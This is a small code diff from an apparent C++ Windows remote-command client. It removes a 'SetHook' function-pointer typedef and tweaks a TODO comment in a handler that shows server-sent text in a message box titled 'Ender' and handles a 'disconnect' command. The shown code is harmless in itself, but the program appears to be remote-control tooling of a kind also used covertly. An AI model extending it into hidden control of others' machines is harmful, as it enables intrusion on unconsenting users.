@@ -7,8 +7,6 @@
 
 #pragma comment (lib, "Ws2_32.lib")
 
-typedef VOID(*SetHook)();
-
 int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrev, PWSTR lpCmdLine, int nCmdShow)
 {
 	init_winsock();
@@ -46,7 +44,7 @@ void handle_command(CLIENT& client, string& command)
 {
 	if(command.substr(0,5) == "show ")
 	{
-		MessageBoxA(NULL, command.c_str() + 5, "Ender", MB_OK); // TODO: FIX (client hangs when messagebox is displayed)
+		MessageBoxA(NULL, command.c_str() + 5, "Ender", MB_OK); // TODO: FIX (client hangs when messagebox is displayed untill user closes box)
 	}
 	else if(command == "disconnect")
 	{
